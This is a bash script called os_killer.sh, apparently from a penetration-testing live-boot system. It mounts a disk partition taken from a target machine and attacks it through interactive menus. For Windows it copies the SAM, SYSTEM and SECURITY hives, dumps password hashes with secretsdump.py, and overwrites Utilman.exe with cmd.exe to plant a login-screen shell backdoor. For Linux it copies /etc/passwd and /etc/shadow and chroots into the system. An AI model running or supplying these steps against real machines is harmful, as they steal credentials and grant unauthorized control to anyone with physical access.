#!/bin/bash
# os_killer.sh
# Created on: Sat 29 Jul 2023 08:18:34 PM CEST
#
#  ____   __  ____  __
# (  _ \ /. |(  _ \/  )
#  )___/(_  _))___/ )(
# (__)    (_)(__)  (__)
#
# Description:
#  A script that will let you take a partition mount it and do a few simple
#  attacks on it. For windows partitions it will dump the SAM database to the
#  tmp of the p3ng0s system and will also let you change cmd.exe to utilman.exe.
#  For linux it will allow you to have a copy of etc/shadow and etc/passwd on the
#  tmp of the p3ng0s system and will also allow you to chroot inside of  the system
#  for extra control ^^
# Usage:
#  This script is usually run by .bash_profile during the welcome page of p3ng0s
#  but can be run independantly.

PART=
LOOT_FOLDER=$([ -d /home/p4p1-live/loot ] && echo '/home/p4p1-live/loot' || echo '/tmp')

echo $LOOT_FOLDER

function banner() {
	echo -e "\e[31m               .-')            .-. .-')                                 ('-.  _  .-')   \e[0m"
	echo -e "\e[31m              ( OO ).          \\  ( OO )                              _(  OO)( \\( -O )  \e[0m"
	echo -e "\e[31m .-'),-----. (_)---\_)         ,--. ,--.  ,-.-')  ,--.      ,--.     (,------.,------.  \e[0m"
	echo -e "\e[31m( OO'  .-.  '/    _ |          |  .'   /  |  |OO) |  |.-')  |  |.-')  |  .---'|   /\`. ' \e[0m"
	echo -e "\e[31m/   |  | |  |\\  :\` \`.          |      /,  |  |  \\ |  | OO ) |  | OO ) |  |    |  /  | | \e[0m"
	echo -e "\e[31m\\_) |  |\|  | '..\`''.)  (\`-.   |     ' _) |  |(_/ |  |\`-' | |  |\`-' |(|  '--. |  |_.' | \e[0m"
	echo -e "\e[31m  \\ |  | |  |.-._)   \\ (OO  )_ |  .   \\  ,|  |_.'(|  '---.'(|  '---.' |  .--' |  .  '.' \e[0m"
	echo -e "\e[31m   \`'  '-'  '\\       /,------.)|  |\\   \\(_|  |    |      |  |      |  |  \`---.|  |\\  \\  \e[0m"
	echo -e "\e[31m     \`-----'  \`-----' \`------' \`--' '--'  \`--'    \`------'  \`------'  \`------'\`--' '--' \e[0m"
}

function linux_exp() {
    SEL=$(dialog --title "What are you looking for?" \
        --menu "...." 20 70 15 \
        1 "dump passwd & shadow" \
        2 "chroot :)" \
        2>&1 >/dev/tty)
        [ $SEL = 1 ] && $(cp -r /mnt/etc/passwd $LOOT_FOLDER/passwd; cp -r /mnt/etc/shadow $LOOT_FOLDER/shadow)
        [ $SEL = 2 ] && chroot /mnt

        echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of $LOOT_FOLDER :)"
}

function windows_exp() {
    SEL=$(dialog --title "What are you looking for?" \
        --menu "...." 20 70 15 \
        1 "Dump SAM ^^" \
        2 "swap cmd.exe and utilman.exe" \
        3 "secrets dump me baby right now" \
        2>&1 >/dev/tty)
        [ $SEL = 1 ] && $(cp -r /mnt/Windows/System32/config/SAM $LOOT_FOLDER/SAM ; cp -r /mnt/Windows/System32/config/SYSTEM $LOOT_FOLDER/SYSTEM; cp -r /mnt/Windows/System32/config/SECURITY $LOOT_FOLDER/SECURITY)
        [ $SEL = 2 ] && cp -r /mnt/Windows/System32/cmd.exe /mnt/Windows/System32/Utilman.exe
        [ $SEL = 3 ] && secretsdump.py -sam /mnt/Windows/System32/config/SAM -system /mnt/Windows/System32/config/SYSTEM -security /mnt/Windows/System32/config/SECURITY LOCAL | tee >(cat) > $LOOT_FOLDER/secretsdump.log

        echo -e "\e[1;31m[!]\e[m All of the ouput and results are inside of /tmp/ :)"
}

function select_os() {
    mount $PART /mnt
    [ $? -ne 0 ] && $(sleep 4;exit -1)
    OS_SEL=$(dialog --title "Select a operating system" \
        --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
        1 "Windows" \
        2 "Linux" \
        2>&1 >/dev/tty)
    [ $OS_SEL = 1 ] && windows_exp
    [ $OS_SEL = 2 ] && linux_exp
    umount /mnt
}

function list_hard_drives() {
    partitions=$(lsblk -npo NAME,SIZE --sort SIZE | tac)
    partition_options=()
    while read -r name size; do
        partition_options+=( "$name" "$name ($size)" )
    done <<< "$partitions"
    selected_partition=$(dialog --title "Select a Partition" \
                                 --menu "Choose a partition to proceed (ordered by size):" 20 70 15 \
                                 "${partition_options[@]}" \
                                 2>&1 >/dev/tty)
    if [[ -z "$selected_partition" ]]; then
        echo -e "\e[1;31m[!]\e[m No partition selected. Exiting.. ^^"
        exit 0
    fi
    PART=$selected_partition
}

if [ "$EUID" -ne 0 ]; then
    banner
    echo -e "\e[1;31m[!]\e[m Please enter the root password (default: p4p1)"
    exec sudo bash "$0" "$@"
else
    export DIALOGRC="/etc/p3ng0s/dialogrc"
    list_hard_drives
    select_os
fi

echo -e "\e[1;32m[*]\e[m you will now be booting in the gui environement if run at startup ^^"
sleep 5
exit
